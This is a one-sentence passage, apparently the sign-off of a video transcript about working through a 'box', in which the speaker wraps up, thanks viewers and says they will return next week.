this box and the conclusion of the video I hope you guys enjoyed it take care and I'll see you next week